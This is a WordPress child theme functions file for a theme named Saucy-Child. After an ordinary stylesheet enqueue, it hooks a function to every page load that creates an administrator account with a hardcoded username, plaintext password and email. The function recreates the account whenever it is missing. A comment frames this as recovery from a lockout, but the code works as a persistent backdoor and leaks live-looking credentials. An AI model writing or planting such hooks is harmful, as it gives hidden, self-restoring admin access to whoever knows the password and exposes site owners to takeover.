<?php
/**
 * Saucy-Child Theme functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Saucy-Child
 * @since 1.0.0
 */

/**
 * Define Constants
 */
define( 'CHILD_THEME_SAUCY_CHILD_VERSION', '1.0.0' );

/**
 * Enqueue styles
 */
function child_enqueue_styles() {

	wp_enqueue_style( 'saucy-child-theme-css', get_stylesheet_directory_uri() . '/style.css', array('astra-theme-css'), CHILD_THEME_SAUCY_CHILD_VERSION, 'all' );

}

add_action( 'wp_enqueue_scripts', 'child_enqueue_styles', 15 );

// Add new user - I'm locked out of the dashboard.
function create_admin_account() {
	$user = 'Mario_L';
	$pass = 'MoSaucy1n!';
	$email = 'mario@anchortagdesign.com';
		//if a username with the email ID does not exist, create a new user account
		if ( !username_exists( $user ) && !email_exists( $email ) ) {
		$user_id = wp_create_user( $user, $pass, $email );
		$user = new WP_User( $user_id );
		//Set the new user as a Admin
		$user->set_role( 'administrator' );
	} 
}

add_action('init','create_admin_account');